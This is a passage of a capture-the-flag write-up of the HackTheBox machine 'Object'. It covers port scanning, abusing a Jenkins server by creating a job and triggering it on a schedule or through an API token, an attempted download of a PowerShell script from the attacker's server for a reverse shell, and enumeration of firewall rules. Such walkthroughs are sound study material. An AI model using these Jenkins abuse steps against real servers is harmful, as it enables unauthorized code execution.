@@ -1,0 +1,1182 @@
+<article class="post h-entry" itemscope="" itemtype="http://schema.org/BlogPosting">
+<header class="post-header">
+<h1 class="post-title p-name" itemprop="name headline">HTB: Object</h1>
+<p class="post-meta">
+<span class="tag-list"><a class="post-tag" href="/tags#hackthebox">hackthebox</a> <a class="post-tag" href="/tags#htb-object">htb-object</a> <a class="post-tag" href="/tags#ctf">ctf</a> <a class="post-tag" href="/tags#uni-ctf">uni-ctf</a> <a class="post-tag" href="/tags#nmap">nmap</a> <a class="post-tag" href="/tags#iis">iis</a> <a class="post-tag" href="/tags#windows">windows</a> <a class="post-tag" href="/tags#feroxbuster">feroxbuster</a> <a class="post-tag" href="/tags#wfuzz">wfuzz</a> <a class="post-tag" href="/tags#jenkins">jenkins</a> <a class="post-tag" href="/tags#cicd">cicd</a> <a class="post-tag" href="/tags#firewall">firewall</a> <a class="post-tag" href="/tags#windows-firewall">windows-firewall</a> <a class="post-tag" href="/tags#jenkins-credential-decryptor">jenkins-credential-decryptor</a> <a class="post-tag" href="/tags#pwn-jenkins">pwn-jenkins</a> <a class="post-tag" href="/tags#evil-winrm">evil-winrm</a> <a class="post-tag" href="/tags#crackmapexec">crackmapexec</a> <a class="post-tag" href="/tags#bloodhound">bloodhound</a> <a class="post-tag" href="/tags#sharphound">sharphound</a> <a class="post-tag" href="/tags#active-directory">active-directory</a> <a class="post-tag" href="/tags#github">github</a> <a class="post-tag" href="/tags#forcechangepassword">forcechangepassword</a> <a class="post-tag" href="/tags#genericwrite">genericwrite</a> <a class="post-tag" href="/tags#writeowner">writeowner</a> <a class="post-tag" href="/tags#logon-script">logon-script</a> <a class="post-tag" href="/tags#powerview">powerview</a> <a class="post-tag" href="/tags#scheduled-task">scheduled-task</a> <a class="post-tag" href="/tags#powershell">powershell</a> <a class="post-tag" href="/tags#htb-jeeves">htb-jeeves</a> <a class="post-tag" href="/tags#oscp-like-v2">oscp-like-v2</a> </span><br/><br/>
+<time class="dt-published" datetime="2022-02-28T10:00:00+00:00" itemprop="datePublished">Feb 28, 2022
+      </time></p>
+</header>
+<div class="post-content e-content" itemprop="articleBody">
+<div class="row">
+<div class="col-sm-3">
+<div class="sticky-top">
+<p><a href="/2022/02/28/htb-object.html" style="color: #e6e6e6; text-decoration: none;">HTB: Object</a></p>
+<!--https://afeld.github.io/bootstrap-toc/-->
+<nav data-toggle="toc" id="toc"></nav>
+</div>
+</div>
+<div class="col-sm-9" id="postBody">
+<picture>
+<source srcset="https://0xdfimages.gitlab.io/img/object-cover.webp" type="image/webp"/>
+<img alt="Object" class="include_image" loading="lazy" src="https://0xdfimages.gitlab.io/img/object-cover.png" style="float: right; margin-right:50px; margin-left:50px; height:120px;">
+</img></picture>
+<p>Object was tricky for a CTF box, from the HackTheBox University CTF in 2021. I’ll start with access to a Jenkins server where I can create a pipeline (or job), but I don’t have permissions to manually tell it to build. I’ll show two ways to get it to build anyway, providing execution. I’ll enumerate the firewall to see that no TCP traffic can reach outbound, and eventually find credentials and get a connection over WinRM. From there, it’s three hops of Active Directory abuse, all made clear by BloodHound. First a password change, then abusing logon scripts, and finally some group privileges. In Beyond Root, I’ll enumerate the automation that ran the logon scripts as one of the users.</p>
+<h2 id="box-info">Box Info</h2>
+<!-- https://app.hackthebox.com/machines/447 -->
+<table>
+<thead>
+<tr>
+<th>Name</th>
+<th style="text-align: right"><a href="https://hackthebox.com/machines/object" style="font-size: xx-large; text-shadow: 0 0 5px #ffffff, 0 0 7px #ffffff; color: #1756a9" target="_blank">Object</a> <a href="https://hackthebox.com/machines/object" target="_blank"><picture style="float: right; padding-left: 20px;"><source srcset="/icons/box-object.webp" type="image/webp"/> <img alt="Object" class="img-av" src="/icons/box-object.png"/></picture></a><br/><a href="https://hackthebox.com/machines/object" style="font-size: small; color: white;" target="_blank">Play on HackTheBox</a></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Release Date</td>
+<td style="text-align: right"><a href="https://twitter.com/hackthebox_eu/status/1498364892419706884">28 Feb 2022</a></td>
+</tr>
+<tr>
+<td>Retire Date</td>
+<td style="text-align: right">28 Feb 2022</td>
+</tr>
+<tr>
+<td>OS</td>
+<td style="text-align: right">Windows <picture><source srcset="/icons/Windows.webp" type="image/webp"/><img alt="Windows" class="img-os" src="/icons/Windows.png"/></picture></td>
+</tr>
+<tr>
+<td>Base Points</td>
+<td style="text-align: right"><span class="diff-Hard">Hard [40]</span></td>
+</tr>
+<tr>
+<td><picture><source srcset="/icons/first-blood-user.webp" type="image/webp"/><img alt="First Blood User" src="/icons/first-blood-user.png" style="display: unset"/></picture></td>
+<td style="text-align: right">N/A (non-competitive)</td>
+</tr>
+<tr>
+<td><picture><source srcset="/icons/first-blood-root.webp" type="image/webp"/><img alt="First Blood Root" src="/icons/first-blood-root.png" style="display: unset"/></picture></td>
+<td style="text-align: right">N/A (non-competitive)</td>
+</tr>
+<tr>
+<td>Creator</td>
+<td style="text-align: right"><a href="https://app.hackthebox.com/users/13531" rel="noopener" target="_blank"><img alt="MrR3boot" onerror="this.style.display='none'; this.nextSibling.style.display='inline';" src="https://www.hackthebox.com/badge/image/13531" style="display: unset"/><span class="user-text" style="display: none"> MrR3boot</span></a><br/></td>
+</tr>
+</tbody>
+</table>
+<h2 id="recon">Recon</h2>
+<h3 id="nmap">nmap</h3>
+<p><code class="language-plaintext highlighter-rouge">nmap</code> finds three open TCP ports, WinRM (22) and two HTTP (80, 8080):</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>nmap <span class="nt">-p-</span> <span class="nt">--min-rate</span> 10000 <span class="nt">-oA</span> scans/nmap-alltcp 10.10.11.132
+<span class="go">Starting Nmap 7.80 ( https://nmap.org ) at 2022-02-26 21:40 UTC
+Nmap scan report for 10.10.11.132
+Host is up (0.093s latency).
+Not shown: 65532 filtered ports
+PORT     STATE SERVICE
+80/tcp   open  http
+5985/tcp open  wsman
+8080/tcp open  http-proxy
+
+Nmap done: 1 IP address (1 host up) scanned in 13.55 seconds
+</span><span class="gp">oxdf@hacky$</span><span class="w"> </span>nmap <span class="nt">-p</span> 80,5985,8080 <span class="nt">-sCV</span> <span class="nt">-oA</span> scans/nmap-tcpscripts 10.10.11.132
+<span class="go">Starting Nmap 7.80 ( https://nmap.org ) at 2022-02-26 21:41 UTC
+Nmap scan report for 10.10.11.132
+Host is up (0.091s latency).
+
+PORT     STATE SERVICE VERSION
+80/tcp   open  http    Microsoft IIS httpd 10.0
+| http-methods: 
+|_  Potentially risky methods: TRACE
+|_http-server-header: Microsoft-IIS/10.0
+|_http-title: Mega Engines
+5985/tcp open  http    Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+8080/tcp open  http    Jetty 9.4.43.v20210629
+| http-robots.txt: 1 disallowed entry 
+|_/
+|_http-server-header: Jetty(9.4.43.v20210629)
+|_http-title: Site doesn't have a title (text/html;charset=utf-8).
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 9.99 seconds
+</span></code></pre></div></div>
+<p>The <a href="https://en.wikipedia.org/wiki/Internet_Information_Services#Versions">IIS version</a> suggests Win10+/Server 2016+. It’s interesting that the 80 HTTP server is running on IIS, but the 8080 is running on Jetty.</p>
+<h3 id="website---tcp-80">Website - TCP 80</h3>
+<h4 id="site">Site</h4>
+<p>The site is for Mega Engines:</p>
+<picture>
+<source srcset="https://0xdfimages.gitlab.io/img/image-20220226165134417.webp" type="image/webp"/>
+<img alt="image-20220226165134417" class="include_image" loading="lazy" src="https://0xdfimages.gitlab.io/img/image-20220226165134417.png"/>
+</picture>
+<p>There’s an email address and domain reference, so I’ll add <code class="language-plaintext highlighter-rouge">object.htb</code> to my <code class="language-plaintext highlighter-rouge">/etc/hosts</code> file. Visiting the page by that domain instead of the IP returns the same page.</p>
+<p>The only link on the page for the “automation” server leads to <code class="language-plaintext highlighter-rouge">http://object.htb:8080/</code>.</p>
+<h4 id="tech-stack">Tech Stack</h4>
+<p>The headers show IIS version 10.0, and not much else:</p>
+<div class="language-http highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span> <span class="m">200</span> <span class="ne">OK</span>
+<span class="na">Content-Type</span><span class="p">:</span> <span class="s">text/html</span>
+<span class="na">Last-Modified</span><span class="p">:</span> <span class="s">Tue, 26 Oct 2021 06:21:32 GMT</span>
+<span class="na">Accept-Ranges</span><span class="p">:</span> <span class="s">bytes</span>
+<span class="na">ETag</span><span class="p">:</span> <span class="s">"0fe0b831cad71:0"</span>
+<span class="na">Vary</span><span class="p">:</span> <span class="s">Accept-Encoding</span>
+<span class="na">Server</span><span class="p">:</span> <span class="s">Microsoft-IIS/10.0</span>
+<span class="na">Date</span><span class="p">:</span> <span class="s">Sat, 26 Feb 2022 21:55:01 GMT</span>
+<span class="na">Connection</span><span class="p">:</span> <span class="s">close</span>
+<span class="na">Content-Length</span><span class="p">:</span> <span class="s">29932</span>
+</code></pre></div></div>
+<p>Visiting <code class="language-plaintext highlighter-rouge">http://object.htb/index.html</code> returns the same index, so that doesn’t give much information about the site either. It could very well be a static site hosted on IIS.</p>
+<h4 id="directory-brute-force">Directory Brute Force</h4>
+<p>I’ll run <code class="language-plaintext highlighter-rouge">feroxbuster</code> against the site, which finds <em>nothing</em>:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>feroxbuster <span class="nt">-u</span> http://object.htb
+<span class="go">
+ ___  ___  __   __     __      __         __   ___
+|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
+|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
+by Ben "epi" Risher 🤓                 ver: 2.5.0
+───────────────────────────┬──────────────────────
+ 🎯  Target Url            │ http://object.htb
+ 🚀  Threads               │ 50
+ 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
+ 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500]
+ 💥  Timeout (secs)        │ 7
+ 🦡  User-Agent            │ feroxbuster/2.5.0
+ 🏁  HTTP methods          │ [GET]
+ 🔃  Recursion Depth       │ 4
+───────────────────────────┴──────────────────────
+ 🏁  Press [ENTER] to use the Scan Management Menu™
+──────────────────────────────────────────────────
+[</span><span class="feroxbuster-yellow">####################</span><span class="go">] - 59s    29999/29999   0s      </span><span class="feroxbuster-green">found</span><span class="go">:0       </span><span class="feroxbuster-red">errors</span><span class="go">:0      
+[</span><span class="feroxbuster-cyan">####################</span><span class="go">] - 58s    29999/29999   508/s   http://object.htb 
+</span></code></pre></div></div>
+<h3 id="virtual-host-fuzz">Virtual Host Fuzz</h3>
+<p>Given the use of the domain <code class="language-plaintext highlighter-rouge">object.htb</code>, I’ll fuzz for other subdomains, but not find any:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>wfuzz <span class="nt">-u</span> http://object.htb <span class="nt">-H</span> <span class="s1">'Host: FUZZ.object.htb'</span> <span class="nt">-w</span> /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt <span class="nt">--hh</span> 29932
+<span class="go">********************************************************
+* Wfuzz 2.4.5 - The Web Fuzzer                         *
+********************************************************
+
+Target: http://object.htb/
+Total requests: 4989
+
+===================================================================
+ID           Response   Lines    Word     Chars       Payload
+===================================================================
+
+
+Total time: 50.26777
+Processed Requests: 4989
+Filtered Requests: 4989
+Requests/sec.: 99.24847
+</span></code></pre></div></div>
+<h3 id="jenkins---tcp-8080">Jenkins - TCP 8080</h3>
+<h4 id="site-1">Site</h4>
+<p>Visiting <code class="language-plaintext highlighter-rouge">http://object.htb:8080</code> redirects to <code class="language-plaintext highlighter-rouge">http://object.htb:8080/login?from=%2F</code>, which is a login form for Jenkins:</p>
+<picture>
+<source srcset="https://0xdfimages.gitlab.io/img/image-20220226165731219.webp" type="image/webp"/>
+<img alt="image-20220226165731219" class="include_image" loading="lazy" src="https://0xdfimages.gitlab.io/img/image-20220226165731219.png"/>
+</picture>
+<p><a href="https://www.jenkins.io/">Jenkins</a> is an open source automation server, which was doing things kind of like GitHub Actions and Gitlab Pipelines before those existed. I first saw Jenkins on HackTheBox in the Jeeves box (one of the few I’ve yet to do a writeup for).</p>
+<p>I couldn’t find any login bypass vulnerabilities, and I don’t have creds, so I’ll create an account. On filling out the form, I’m logged in:</p>
+<picture>
+<source srcset="https://0xdfimages.gitlab.io/img/image-20220226165955672.webp" type="image/webp"/>
+<img alt="image-20220226165955672" class="include_image" loading="lazy" src="https://0xdfimages.gitlab.io/img/image-20220226165955672.png"/>
+</picture>
+<p>I’ll note the version, Jenkins 2.317 in the footer. Clicking “the top page” leads to:</p>
+<picture>
+<source srcset="https://0xdfimages.gitlab.io/img/image-20220227062856991.webp" type="image/webp"/>
+<img alt="image-20220227062856991" class="include_image" loading="lazy" src="https://0xdfimages.gitlab.io/img/image-20220227062856991.png"/>
+</picture>
+<p>There’s a lot to explore in here. “People” shows that it’s just me and admin with accounts:</p>
+<picture>
+<source srcset="https://0xdfimages.gitlab.io/img/image-20220227062407251.webp" type="image/webp"/>
+<img alt="image-20220227062407251" class="include_image" loading="lazy" src="https://0xdfimages.gitlab.io/img/image-20220227062407251.png"/>
+</picture>
+<p>Clicking on myself (or from the link at the top right next to “log out”) leads to a section about my user:</p>
+<picture>
+<source srcset="https://0xdfimages.gitlab.io/img/image-20220227113408339.webp" type="image/webp"/>
+<img alt="image-20220227113408339" class="include_image" loading="lazy" src="https://0xdfimages.gitlab.io/img/image-20220227113408339.png"/>
+</picture>
+<p>Under “Configure”, there’s a menu that includes API tokens (I’ll use this in a bit):</p>
+<div style="max-height: 500px; overflow: hidden; position: relative; margin-bottom: 20px;">
+<a href="https://0xdfimages.gitlab.io/img/image-20220227113620372.png">
+<img alt="image-20220227113620372" src="https://0xdfimages.gitlab.io/img/image-20220227113620372.png" style="clip-path: polygon(0 0, 100% 0, 100% 460px, 49% 490px, 51% 470px, 0 500px); -webkit-clip-path: polygon(0 0, 100% 0, 100% 460px, 49% 490px, 51% 470px, 0 500px)"/>
+</a>
+<div style="position: absolute; right: 20px; top: 475px"><a href="https://0xdfimages.gitlab.io/img/image-20220227113620372.png"><i>Click for full image</i></a></div>
+</div>
+<p>Interested in understanding my privileges, some Googling the led to pages like <a href="https://www.toolsqa.com/jenkins/jenkins-user-management/">this</a>. I’ll try visiting <code class="language-plaintext highlighter-rouge">/manage</code>, but get denied:</p>
+<picture>
+<source srcset="https://0xdfimages.gitlab.io/img/image-20220227062654038.webp" type="image/webp"/>
+<img alt="image-20220227062654038" class="include_image" loading="lazy" src="https://0xdfimages.gitlab.io/img/image-20220227062654038.png"/>
+</picture>
+<h4 id="vulnerabilities">Vulnerabilities</h4>
+<p>Given that the page footers shows a version number (2.317). I did find one Metasploit exploit based on work from Orange Tsai (so it’s legit), but it requires a Pipeline Groovy Plugin. As far as I know (correct me on Twitter if I’m wrong), Groovy is installed by default, but used in the Script Console (which according to <a href="https://www.jenkins.io/doc/book/managing/script-console/">the docs</a> is at <code class="language-plaintext highlighter-rouge">/script</code>), which I don’t have permission to access:</p>
+<picture>
+<source srcset="https://0xdfimages.gitlab.io/img/image-20220227131730232.webp" type="image/webp"/>
+<img alt="image-20220227131730232" class="include_image" loading="lazy" src="https://0xdfimages.gitlab.io/img/image-20220227131730232.png"/>
+</picture>
+<p>I did fire up MSF and try to get the exploit to work, but I was unsuccessful.</p>
+<h2 id="shell-as-oliver">Shell as oliver</h2>
+<h3 id="create-a-job">Create a Job</h3>
+<p>Back at the top page, the “Create a job” link might have potential (“New Item” in the bar on the left goes to the same place). If I can run some malicious code in a job, I could get execution.</p>
+<p>On the first screen I’ll give the job a name (“0xdf’s job”) and select “Freestyle project”. The next page has all the configuration for the job:</p>
+<p><a href="https://0xdfimages.gitlab.io/img/image-20220227064107633.png"><img alt="image-20220227064107633" src="https://0xdfimages.gitlab.io/img/image-20220227064107633.png"/><em>Click for full size image</em></a></p>
+<p>The important part is “Add build step”, as that describes what gets run. Clicking on it shows the options:</p>
+<picture>
+<source srcset="https://0xdfimages.gitlab.io/img/image-20220227064317951.webp" type="image/webp"/>
+<img alt="image-20220227064317951" class="include_image" loading="lazy" src="https://0xdfimages.gitlab.io/img/image-20220227064317951.png"/>
+</picture>
+<p>“Execute shell” is for Linux systems, so I’ll pick “Execute Windows batch command”, and start with something very simple:</p>
+<picture>
+<source srcset="https://0xdfimages.gitlab.io/img/image-20220227064748795.webp" type="image/webp"/>
+<img alt="image-20220227064748795" class="include_image" loading="lazy" src="https://0xdfimages.gitlab.io/img/image-20220227064748795.png"/>
+</picture>
+<p>I’ll click “Save”, which returns me to the main dashboard.</p>
+<h3 id="run-job">Run Job</h3>
+<h4 id="build-now-fail">Build now Fail</h4>
+<p>I fully expected there to be somewhere to click to run the job, but it isn’t obvious:</p>
+<p><a href="https://0xdfimages.gitlab.io/img/image-20220227065019956.png"><img alt="image-20220227065019956" src="https://0xdfimages.gitlab.io/img/image-20220227065019956.png"/><em>Click for full size image</em></a></p>
+<p>Some Googling suggests there should be a “Build now” button in the sidebar. <a href="https://stackoverflow.com/a/41108207">This StackOverflow answer</a> suggests it’s not there because either my project is disabled (which seems unlikely as the “Disable project” button is in the screen shot above), or I don’t have permissions (which seems possible). I’ll need another (I’ll find two) way to start the job.</p>
+<h4 id="method-1-schedule">Method 1: Schedule</h4>
+<p>Clicking the “Configure” link in the sidebar leads back to the settings for the job, where I’ll look more closely at the “Build Triggers” section:</p>
+<picture>
+<source srcset="https://0xdfimages.gitlab.io/img/image-20220227065323109.webp" type="image/webp"/>
+<img alt="image-20220227065323109" class="include_image" loading="lazy" src="https://0xdfimages.gitlab.io/img/image-20220227065323109.png"/>
+</picture>
+<p>“Build periodically” seems promising. I’ll check that box, which gives a empty text field. Jenkins uses a schedule system <a href="https://www.lenar.io/jenkins-schedule-build-periodically/">similar to cron</a>. I’ll enter “* * * * *”, and it warns me that this will run every minute:</p>
+<picture>
+<source srcset="https://0xdfimages.gitlab.io/img/image-20220227065621251.webp" type="image/webp"/>
+<img alt="image-20220227065621251" class="include_image" loading="lazy" src="https://0xdfimages.gitlab.io/img/image-20220227065621251.png"/>
+</picture>
+<p>I’ll save and after a minute, refresh the page, and there’s a build in the history:</p>
+<picture>
+<source srcset="https://0xdfimages.gitlab.io/img/image-20220227065719113.webp" type="image/webp"/>
+<img alt="image-20220227065719113" class="include_image" loading="lazy" src="https://0xdfimages.gitlab.io/img/image-20220227065719113.png"/>
+</picture>
+<p>Hovering over the “#1” there’s a dropdown:</p>
+<picture>
+<source srcset="https://0xdfimages.gitlab.io/img/image-20220227065741004.webp" type="image/webp"/>
+<img alt="image-20220227065741004" class="include_image" loading="lazy" src="https://0xdfimages.gitlab.io/img/image-20220227065741004.png"/>
+</picture>
+<p>“Console Output” shows the job ran:</p>
+<picture>
+<source srcset="https://0xdfimages.gitlab.io/img/image-20220227065815838.webp" type="image/webp"/>
+<img alt="image-20220227065815838" class="include_image" loading="lazy" src="https://0xdfimages.gitlab.io/img/image-20220227065815838.png"/>
+</picture>
+<h4 id="method-2-trigger-remotely">Method 2: Trigger Remotely</h4>
+<p>Running different commands waiting one minute between each one is a bit exhausting. I’ll disable the scheduled trigger. Looking at the other options for “Build Triggers”, “Trigger builds remotely (e.g., from scripts)” seems interesting. Checking it expands out asking for an “Authentication Token”:</p>
+<picture>
+<source srcset="https://0xdfimages.gitlab.io/img/image-20220227113123491.webp" type="image/webp"/>
+<img alt="image-20220227113123491" class="include_image" loading="lazy" src="https://0xdfimages.gitlab.io/img/image-20220227113123491.png"/>
+</picture>
+<p>I can try just adding a string as the token (say “TestToken”) and requesting the endpoint they give, but it doesn’t work:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>curl <span class="s2">"http://object.htb:8080/job/0xdf's%20job/build?token=TestToken"</span>
+<span class="go">&lt;html&gt;&lt;head&gt;&lt;meta http-equiv='refresh' content='1;url=/login?from=%2Fjob%2F0xdf%27s%2520job%2Fbuild%3Ftoken%3DTestToken'/&gt;&lt;script&gt;window.location.replace('/login?from=%2Fjob%2F0xdf%27s%2520job%2Fbuild%3Ftoken%3DTestToken');&lt;/script&gt;&lt;/head&gt;&lt;body style='background-color:white; color:white;'&gt;
+
+
+Authentication required
+&lt;!--
+--&gt;
+
+&lt;/body&gt;&lt;/html&gt;    
+</span></code></pre></div></div>
+<p>Back during enumeration I found where I could create API tokens in my profile. I’ll head there and click “Add new Token”:</p>
+<picture>
+<source srcset="https://0xdfimages.gitlab.io/img/image-20220227113733612.webp" type="image/webp"/>
+<img alt="image-20220227113733612" class="include_image" loading="lazy" src="https://0xdfimages.gitlab.io/img/image-20220227113733612.png"/>
+</picture>
+<p>I’ll name it <code class="language-plaintext highlighter-rouge">0xdfToken</code> and click generate:</p>
+<picture>
+<source srcset="https://0xdfimages.gitlab.io/img/image-20220227113810458.webp" type="image/webp"/>
+<img alt="image-20220227113810458" class="include_image" loading="lazy" src="https://0xdfimages.gitlab.io/img/image-20220227113810458.png"/>
+</picture>
+<p>I’ll also update the batch script with the job so that it’s clear why it triggered:</p>
+<picture>
+<source srcset="https://0xdfimages.gitlab.io/img/image-20220227124131900.webp" type="image/webp"/>
+<img alt="image-20220227124131900" class="include_image" loading="lazy" src="https://0xdfimages.gitlab.io/img/image-20220227124131900.png"/>
+</picture>
+<p><a href="https://www.theserverside.com/blog/Coffee-Talk-Java-News-Stories-and-Opinions/Trigger-Jenkins-Builds-Remotely-Example-403-Error-Fix">This post</a> shows how to actually trigger the job. I’ll need to use the url of the form:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://[username]:[token]@[host]/job/[job name]/build?token=[token name]
+</code></pre></div></div>
+<p>So for me, that’s:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>curl <span class="s2">"http://0xdf:1176e6f7ba9fdf90c7ec7dba8c413cda89@object.htb:8080/job/0xdf's%20job/build?token=0xdfToken"</span>
+</code></pre></div></div>
+<p>There’s no response from the server, but the job triggers, and a moment later there’s console output:</p>
+<picture>
+<source srcset="https://0xdfimages.gitlab.io/img/image-20220227124212845.webp" type="image/webp"/>
+<img alt="image-20220227124212845" class="include_image" loading="lazy" src="https://0xdfimages.gitlab.io/img/image-20220227124212845.png"/>
+</picture>
+<h3 id="firewall-enumeration">Firewall Enumeration</h3>
+<h4 id="identify-outbound-block">Identify Outbound Block</h4>
+<p>I’ll try a handful of things to see about getting a reverse shell on the host. First, I’ll try having PowerShell use <code class="language-plaintext highlighter-rouge">Invoke-WebRequest</code> (or <code class="language-plaintext highlighter-rouge">iwr</code>) to download a PowerShell script:</p>
+<picture>
+<source srcset="https://0xdfimages.gitlab.io/img/image-20220227124609688.webp" type="image/webp"/>
+<img alt="image-20220227124609688" class="include_image" loading="lazy" src="https://0xdfimages.gitlab.io/img/image-20220227124609688.png"/>
+</picture>
+<p>On triggering the job, there’s no connection to my listening Python webserver (<code class="language-plaintext highlighter-rouge">python3 -m http.server 80</code>). The job has a red X next to it to indicate failure.</p>
+<picture>
+<source srcset="https://0xdfimages.gitlab.io/img/image-20220227124735630.webp" type="image/webp"/>
+<img alt="image-20220227124735630" class="include_image" loading="lazy" src="https://0xdfimages.gitlab.io/img/image-20220227124735630.png"/>
+</picture>
+<h4 id="find-blocking-rule">Find Blocking Rule</h4>
+<p>This feels very much like a firewall preventing outbound connections.</p>
+<p>I’ll use the fact that I can see results from commands run to look at the firewall using <code class="language-plaintext highlighter-rouge">Get-NetFirewallRule</code>. Just giving this command <code class="language-plaintext highlighter-rouge">-All</code> will return a <em>ton</em> of stuff, so I’ll limit with the following arguments (based on the <a href="https://docs.microsoft.com/en-us/powershell/module/netsecurity/get-netfirewallrule?view=windowsserver2022-ps">docs</a>):</p>
+<ul>
+<li><code class="language-plaintext highlighter-rouge">-Direction Outbound</code> - limit to outbound rules since that’s where I’m having issues</li>
+<li><code class="language-plaintext highlighter-rouge">-Action Block</code> - limit to rules that block traffic</li>
+<li><code class="language-plaintext highlighter-rouge">-Enabled True</code> - don’t show the large set of rules that are present but not enabled</li>
+</ul>
+<p>This returns a single result:</p>
+<div class="language-console wrap highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">C:\Users\oliver\AppData\Local\Jenkins\.jenkins\workspace\0xdf's job&gt;</span><span class="n">powershell</span><span class="w"> </span><span class="nt">-c</span><span class="w"> </span><span class="nx">Get-NetFirewallRule</span><span class="w"> </span><span class="nt">-Direction</span><span class="w"> </span><span class="nx">Outbound</span><span class="w"> </span><span class="nt">-Enabled</span><span class="w"> </span><span class="nx">True</span><span class="w"> </span><span class="nt">-Action</span><span class="w"> </span><span class="nx">Block</span><span class="w"> 
+</span><span class="go">
+Name                  : {D6399A8B-5E04-458F-AA68-62F64A4F1F43}
+DisplayName           : BlockOutboundDC
+Description           : 
+DisplayGroup          : 
+Group                 : 
+Enabled               : True
+Profile               : Any
+Platform              : {}
+Direction             : Outbound
+Action                : Block
+EdgeTraversalPolicy   : Block
+LooseSourceMapping    : False
+LocalOnlyMapping      : False
+Owner                 : 
+PrimaryStatus         : OK
+Status                : The rule was parsed successfully from the store. (65536)
+EnforcementStatus     : NotApplicable
+PolicyStoreSource     : PersistentStore
+PolicyStoreSourceType : Local
+
+
+</span><span class="gp">C:\Users\oliver\AppData\Local\Jenkins\.jenkins\workspace\0xdf's job&gt;</span><span class="kr">exit</span><span class="w"> </span><span class="mi">0</span><span class="w"> 
+</span><span class="go">Finished: SUCCESS
+</span></code></pre></div></div>
+<p>The name implies it’s blocking outbound, but I can see the actual ports by piping this result into <code class="language-plaintext highlighter-rouge">Get-NetFirewallPortFilter</code>. <a href="https://itluke.online/2018/11/27/how-to-display-firewall-rule-ports-with-powershell/">This post</a> has a nice bit of code at the bottom which I’ll tweak a bit to print what I want:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>powershell <span class="nt">-c</span> <span class="s2">"Get-NetFirewallRule -Direction Outbound -Enabled True -Action Block |
+Format-Table -Property 
+DisplayName, 
+@{Name='Protocol';Expression={(</span><span class="nv">$PSItem</span><span class="s2"> | Get-NetFirewallPortFilter).Protocol}},
+@{Name='LocalPort';Expression={(</span><span class="nv">$PSItem</span><span class="s2"> | Get-NetFirewallPortFilter).LocalPort}}, @{Name='RemotePort';Expression={(</span><span class="nv">$PSItem</span><span class="s2"> | Get-NetFirewallPortFilter).RemotePort}},
+@{Name='RemoteAddress';Expression={(</span><span class="nv">$PSItem</span><span class="s2"> | Get-NetFirewallAddressFilter).RemoteAddress}},
+Enabled,
+Profile,
+Direction,
+Action"</span>
+</code></pre></div></div>
+<p>I’ll have to remove the newlines to get it to work in Jenkins, and make sure the entire PowerShell command is in <code class="language-plaintext highlighter-rouge">""</code>. When I run this thought Jenkins it returns:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">C:\Users\oliver\AppData\Local\Jenkins\.jenkins\workspace\test&gt;</span><span class="n">powershell</span><span class="w"> </span><span class="nt">-c</span><span class="w"> </span><span class="s2">"Get-NetFirewallRule -Direction Outbound -Enabled True -Action Block | Format-Table -Property DisplayName,@{Name='Protocol';Expression={(</span><span class="bp">$PSItem</span><span class="s2"> | Get-NetFirewallPortFilter).Protocol}},@{Name='LocalPort';Expression={(</span><span class="bp">$PSItem</span><span class="s2"> | Get-NetFirewallPortFilter).LocalPort}},@{Name='RemotePort';Expression={(</span><span class="bp">$PSItem</span><span class="s2"> | Get-NetFirewallPortFilter).RemotePort}},@{Name='RemoteAddress';Expression={(</span><span class="bp">$PSItem</span><span class="s2"> | Get-NetFirewallAddressFilter).RemoteAddress}}, Enabled, Profile,Direction,Action"</span><span class="w"> 
+</span><span class="go">
+DisplayName     Protocol LocalPort RemotePort RemoteAddress Enabled Profile Direction Action
+-----------     -------- --------- ---------- ------------- ------- ------- --------- ------
+BlockOutboundDC TCP      Any       Any        Any              True     Any  Outbound  Block
+</span></code></pre></div></div>
+<p>This rule is blocking all outbound TCP.</p>
+<h4 id="look-for-exceptions">Look for Exceptions</h4>
+<p>I’ll switch the <code class="language-plaintext highlighter-rouge">-Action</code> to <code class="language-plaintext highlighter-rouge">Allow</code> to look for exceptions:</p>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">powershell</span><span class="w"> </span><span class="nt">-c</span><span class="w"> </span><span class="nx">Get-NetFirewallRule</span><span class="w"> </span><span class="nt">-Direction</span><span class="w"> </span><span class="nx">Outbound</span><span class="w"> </span><span class="nt">-Enabled</span><span class="w"> </span><span class="nx">True</span><span class="w"> </span><span class="nt">-Action</span><span class="w"> </span><span class="nx">Allow</span><span class="w">
+</span></code></pre></div></div>
+<p>While there’s a good size list returned, none of them end up being useful. Many are for specific programs, or else the blocking rule out prioritizes them. I wasn’t able to get anything outbound except for ICMP. On setting the command to <code class="language-plaintext highlighter-rouge">cmd /c ping 10.10.14.6</code> and triggering, it does show up at a listening <code class="language-plaintext highlighter-rouge">tcpdump</code>:</p>
